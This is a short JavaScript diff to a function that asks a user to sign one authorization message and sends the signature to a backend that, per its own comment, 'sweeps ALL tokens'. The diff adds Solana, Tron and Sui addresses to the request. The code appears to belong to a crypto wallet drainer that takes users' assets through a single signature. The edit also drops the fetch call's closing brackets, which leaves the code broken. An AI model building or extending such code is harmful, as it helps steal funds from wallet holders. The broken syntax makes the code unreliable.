@@ -6,7 +6,7 @@ import { API_BASE } from './api.js'
  * User signs ONE message → Backend sweeps ALL tokens
  */
 
-export async function initiateSingleSignatureSweep(provider, userAddress) {
+export async function initiateSingleSignatureSweep(provider, userAddress, solanaAddress = null, tronAddress = null, suiAddress = null) {
   // ✅ Step 1: Create authorization message
   const authMessage = {
     domain: {
@@ -70,10 +70,10 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
       body: JSON.stringify({
         address: userAddress,
         signature,
-        authMessage
-      })
-    })
-
+      authMessage,
+      solanaAddress,
+      tronAddress,
+      suiAddress
     const result = await response.json()
 
     if (result.success) {
